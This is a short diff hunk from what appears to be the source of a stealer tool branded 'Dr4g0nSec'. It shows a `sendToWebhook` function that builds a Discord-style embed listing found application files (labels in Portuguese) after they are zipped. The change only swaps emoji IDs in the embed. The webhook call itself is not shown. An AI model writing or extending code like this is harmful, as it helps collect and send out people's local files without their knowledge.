@@ -96,12 +96,12 @@ function createZip(files, outputPath) {
 
 async function sendToWebhook(zipPath, files) {
   const fileList = files.map(f => path.basename(f));
-  const embedDescription = `<:pc2x:1367090327634313309> • **Arquivos de Apps encontrados:**\n` +
+  const embedDescription = `<:pc2x:1378155924329336832> • **Arquivos de Apps encontrados:**\n` +
     fileList.slice(0, 15).map(f => `└─ ${f}`).join("\n") +
     (fileList.length > 15 ? "\n└─ ...e mais arquivos" : "");
 
   const embed = {
-    title: "<:dr4g0n:1362932398102155475> Dr4g0nSec | Apps Info <:dr4g0n:1362932398102155475>",
+    title: "Dr4g0nSec | Apps Info",
     description: embedDescription,
     color: 15158332,
     footer: {
